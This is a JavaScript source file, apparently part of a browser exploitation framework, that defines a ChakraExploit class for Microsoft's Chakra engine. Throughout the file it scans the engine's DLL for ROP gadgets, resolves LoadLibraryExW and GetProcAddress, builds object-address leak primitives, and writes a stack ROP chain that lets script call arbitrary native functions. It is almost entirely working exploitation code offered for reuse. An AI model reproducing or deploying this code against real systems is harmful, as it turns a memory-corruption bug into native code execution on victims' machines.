import BaseExploit from "baseexploit";
import Integer from "integer";

/**
 * Constructs an exploit with sensible defaults for Chakra. Child must call initChakra method once read and write methods are available.
 *
 * @augments BaseExploit
 * @class
 * @constructor
 */
function ChakraExploit() {
    var exploit = this;
    BaseExploit.call(this, 64);

    /**
     * Constructs a thread using a Web Worker. The worker script must create a {@link ChakraThreadExploit} object.
     *
     * @memberof ChakraExploit
     * @instance
     * @class
     * @constructor
     */
    function Thread(url) {
        var worker = new Worker(url);
        worker.onmessage = (e) => {
            if (e.data == 'CHAKRA_EXPLOIT') {
                var stackLimit = exploit.globalListFirst.load()[exploit.threadContextStackLimit];
                // Default stack size of web worker
                //   1 MB
                var stackSize = 1 * 1024 * 1024;
                var stackTop = stackLimit.sub(0xc000).add(stackSize);
                var stk = exploit.Uint64Ptr.cast(stackTop).add(-1);
                while (!new Integer(0x41424344, 0x10000).eq(stk.load())) {
                    stk = stk.add(-1);
                    if (stk.address <= stackTop.sub(0x10000)) {
                        throw 'unable to find canary';
                    }
                }
                var worker = exploit.Uint64Ptr.cast(stk[1]);
                var manager = exploit.Uint64Ptr.cast(stk[2]);
                manager[7] = worker;
            } else if (this.onmessage) {
                return this.onmessage(e);
            }
        }
        /**
         * @memberof ChakraExploit#Thread
         * @instance
         * @function onmessage
         */
        this.onmessage = null;
        /**
         * postMessage to web worker
         * @function
         */
        this.postMessage = worker.postMessage.bind(worker);
    }
    this.Thread = Thread;
}
ChakraExploit.prototype = Object.create(BaseExploit.prototype);
ChakraExploit.prototype.constructor = ChakraExploit;
/**
 * Initializes Chakra helpers using memory read and write.
 *
 * @param {Integer|Pointer} vtable Any address in the chakra DLL
 */
ChakraExploit.prototype.initChakra = function (vtable) {
    this.chakraBase = this.findModuleBase(vtable);

    var gadgets = [
        ['callLoadLibraryExW', [0x48, 0x8B, 0xC8, 0x33, 0xD2, 0x41, 0xB8, 0x00, 0x08, 0x00, 0x00, 0xFF, 0x15]],
        ['jmpGetProcAddress', [0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x49, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x0B, 0x48, 0x83, 0xC4, 0x28, 0x48, 0xFF, 0x25]],
        ['nopReturn', [0xC3]],
        ['popRaxReturn', [0x58, 0xC3]],
        ['popRdxReturn', [0x5A, 0xC3]],
        ['popRspReturn', [0x5C, 0xC3]],
        ['popRbpReturn', [0x5D, 0xC3]],
        ['addRsp58Return', [0x48, 0x83, 0xC4, 0x58, 0xC3]],
        ['storeRaxAtRdxReturn', [0x48, 0x89, 0x02, 0xC3]],
        ['entrySlice', [0x8B, 0xF8, 0x41, 0x83, -1, 0x02]],
        ['amd64CallFunction', [0x4C, 0x8B, 0x4E, 0x08, 0x4C, 0x8B, 0x06, 0x48, 0x83, 0xEC, 0x20, 0xFF]],
        ['linkToBeginningThreadContext', [0x48, 0x8B, 0xC4, 0x4C, 0x89, 0x40, 0x18, 0x48, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x08, 0x48, 0x83, -1, -1, 0x00]],
        ['popRcxRdxR8R9Return', [0x48, 0x8B, 0x4C, 0x24, 0x08, 0x48, 0x8B, 0x54, 0x24, 0x10, 0x4C, 0x8B, 0x44, 0x24, 0x18, 0x4C, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0xFF, 0xE0]],
        ['addRsp28Return', [0x48, 0x83, 0xC4, 0x28, 0xC3]],
    ];
    this.gadgets = this.findGadgets(this.chakraBase, gadgets);
    // amd64CallFunction was changed in 1709, so the offset to after the call is different
    //      call rax (FF D0)
    //      call __guard_dispatch_icall_fptr (FF 15 ...)
    this.amd64CallFunctionReturnOffset = this.gadgets.amd64CallFunction[12] == 0xD0 ? 13 : 17;
    // initialize ThreadContext information
    if (this.gadgets.linkToBeginningThreadContext[17] == 0x61) {
        this.threadContextPrev = this.gadgets.linkToBeginningThreadContext[18] / 8;
        this.threadContextNext = this.gadgets.linkToBeginningThreadContext[30] / 8;
        this.globalListFirst = new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.linkToBeginningThreadContext).add(27).add(this.Int32Ptr.cast(this.gadgets.linkToBeginningThreadContext.add(23))[0]));
    } else if (this.gadgets.linkToBeginningThreadContext[17] == 0xA1) {
        this.threadContextPrev = this.gadgets.linkToBeginningThreadContext[18] / 8;
        this.threadContextNext = this.gadgets.linkToBeginningThreadContext[33] / 8;
        this.globalListFirst = new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.linkToBeginningThreadContext).add(30).add(this.Int32Ptr.cast(this.gadgets.linkToBeginningThreadContext.add(26))[0]));
    } else {
        throw 'unsupported version';
    }
    var p = this.globalListFirst[0];
    for (var i = 0;; i++) {
        if ((p[i] & 0xffff) == 0xc000) {
            break;
        }
    }
    this.threadContextStackLimit = i;
    // initialize LoadLibraryExW and GetProcAddress
    var p = this.gadgets.callLoadLibraryExW.add(17).add(this.Int32Ptr.cast(this.gadgets.callLoadLibraryExW.add(13)).load());
    this.LoadLibraryExW = new this.PointerType(this.Uint8Ptr).cast(p).load();
    var p = this.gadgets.jmpGetProcAddress.add(23).add(this.Int32Ptr.cast(this.gadgets.jmpGetProcAddress.add(19)).load());
    this.GetProcAddress = new this.PointerType(this.Uint8Ptr).cast(p).load();
    // initialize stackTop
    this.findStackTop();
    // initialize support for fast addressOf
    this.locateArray = [{}];
    this.locateArrayPtr = new this.PointerType(this.Uint64Ptr).cast(this.addressOfSlow(this.locateArray))[5].add(3);
    if (!this.addressOfSlow(this.locateArray[0]).address.eq(this.locateArrayPtr[0])) {
        throw 'init of addressOf failed!'
    }
}
/**
 * Returns the address of a Javascript object.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOf = function (obj) {
    this.locateArray[0] = obj;
    return this.locateArrayPtr[0];
}
/**
 * Returns the address of a string. Points to the string's bytes.
 *
 * @param {string} s A Javascript string
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOfString = function (s) {
    return this.Uint64Ptr.cast(this.addressOf(s).add(0x10)).load();
}
ChakraExploit.prototype.findStackTop = function () {
    if (this.stackTop === undefined) {
        // Default stack size of browser tab
        //  10 MB
        // Default stack size of web worker
        //   1 MB
        if ('undefined' !== typeof WorkerGlobalScope) {
            var stackLimit = this.globalListFirst.load()[this.threadContextStackLimit];
            var stackSize = 1 * 1024 * 1024;
        } else {
            var stackLimit = this.globalListFirst.load()[this.threadContextStackLimit];
            var stackSize = 10 * 1024 * 1024;
        }
        var stackTop = stackLimit.sub(0xc000).add(stackSize);
        this.stackTop = stackTop;
    }
}
/**
 * Returns the address of a Javascript object. Internal.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOfSlow = function (obj) {
    var address;
    eval('String.prototype.slice').call('', {
        valueOf: () => {
            var gadgets = this.gadgets;
            var stk = this.Uint64Ptr.cast(this.stackTop).add(-1);
            while (!this.Uint64.cast(gadgets.entrySlice).eq(stk.load())) {
                stk = stk.add(-1);
                if (stk.address <= this.stackTop.sub(0x10000)) {
                    throw 'unable to find entrySlice';
                }
            }
            while (!this.Uint64.cast(gadgets.amd64CallFunction).add(this.amd64CallFunctionReturnOffset).eq(stk.load())) {
                stk = stk.add(1);
                if (stk.address >= this.stackTop) {
                    throw 'unable to find amd64CallFunction';
                }
            }
            while (!stk[0].eq(new Integer(0x42424242, 0x10000)) || !stk[2].eq(new Integer(0x41414141, 0x10000))) {
                stk = stk.add(1);
                if (stk.address >= this.stackTop) {
                    throw 'unable to find canaries';
                }
            }
            address = this.Uint8Ptr.cast(stk[1]);
        }
    }, 0, 0, 0, obj, 0x42424242, obj, 0x41414141);
    return address;
}
ChakraExploit.prototype.customInt32Array = function (address) {
    var i32 = new Int32Array(1);
    var p = this.Uint64Ptr.cast(this.addressOf(i32));
    p[4] = 0x7FFFFFFF;
    p[7] = address;
    return i32;
}
/**
 * Call a function pointer with the given arguments. Used internally by FunctionPointer.
 *
 * @param {Integer} address
 * @param {...Integer} args
 * @returns {Integer}
 */
ChakraExploit.prototype.call = function (address, ...args) {
    if (args.length > 10) {
        throw 'too many arguments';
    }
    var returnValAddr;
    eval('String.prototype.slice').call('', {
        valueOf: () => {
            var gadgets = this.gadgets;
            var amd64CallFunction = this.Uint64.cast(gadgets.amd64CallFunction).add(this.amd64CallFunctionReturnOffset);
            var entrySlice = this.Uint64.cast(gadgets.entrySlice);
            var stackBottom = this.stackTop.sub(0x10000);
            var stk = this.customInt32Array(stackBottom);
            for (var i = 0x10000 / 8 - 8; i >= 0; i -= 1) {
                if (entrySlice.low == stk[i*2] && entrySlice.high == stk[i*2+1]) {
                    break;
                }
            }
            if (i == 0) {
                throw 'unable to find entrySlice';
            }
            while (amd64CallFunction.low != stk[i*2] || amd64CallFunction.high != stk[i*2+1]) {
                i++;
                if (i == 0x10000 / 8) {
                    throw 'unable to find amd64CallFunction';
                }
            }
            var stk = this.Uint64Ptr.cast(stackBottom.add(i * 8));
            var savedRbpAddr = stk.add(-2);
            stk = stk.add(-0x20000 / 8);
            var i32 = this.customInt32Array(stk);
            // probe stack
            for (var i = 0x20; i >= 0; i--) {
                let x = i32[i * 0x1000 / 4];
            }
            // helper for writing Uint64 to Int32Array
            function write64(i32, i, val) {
                if (val.address) {
                    val = val.address;
                } else {
                    val = Integer.fromValue(val);
                }
                i32[i * 2 + 0] = val.low;
                i32[i * 2 + 1] = val.high;
            }
            // ROP chain
            // skip saved rbp, rdi, rsi, rbx
            i = 4;
            write64(i32, i, gadgets.popRaxReturn);
            i++;
            write64(i32, i, gadgets.addRsp28Return);
            i++;
            write64(i32, i, gadgets.popRcxRdxR8R9Return);
            i++;
            // unused
            i++;
            if (args[0] !== undefined)
                write64(i32, i, args[0]); // rcx
            i++;
            if (args[1] !== undefined)
                write64(i32, i, args[1]); // rdx
            i++;
            if (args[2] !== undefined)
                write64(i32, i, args[2]); // r8
            i++;
            if (args[3] !== undefined)
                write64(i32, i, args[3]); // r9
            i++;
            write64(i32, i, gadgets.nopReturn); // fix stack alignment
            i++;
            write64(i32, i, address);
            i++;
            write64(i32, i, gadgets.addRsp58Return);
            i++;
            i += 4; // skip 0x20 shadow space
            if (args[4] !== undefined)
                write64(i32, i, args[4]);
            i++;
            if (args[5] !== undefined)
                write64(i32, i, args[5]);
            i++;
            if (args[6] !== undefined)
                write64(i32, i, args[6]);
            i++;
            if (args[7] !== undefined)
                write64(i32, i, args[7]);
            i++;
            if (args[8] !== undefined)
                write64(i32, i, args[8]);
            i++;
            if (args[9] !== undefined)
                write64(i32, i, args[9]);
            i++;
            if (args[10] !== undefined)
                write64(i32, i, args[10]);
            i++;
            write64(i32, i, gadgets.popRdxReturn);
            i++;
            write64(i32, i, stk);
            i++;
            write64(i32, i, gadgets.storeRaxAtRdxReturn);
            i++;
            write64(i32, i, gadgets.popRaxReturn);
            i++;
            write64(i32, i, new Integer(0, 0x40000));
            i++;
            write64(i32, i, gadgets.popRbpReturn);
            i++;
            write64(i32, i, savedRbpAddr.load());
            i++;
            write64(i32, i, gadgets.popRspReturn);
            i++;
            write64(i32, i, savedRbpAddr.add(2));
            i++;
            savedRbpAddr[0] = stk;
            returnValAddr = stk;
        }
    });
    return returnValAddr[0];
}

export default ChakraExploit;
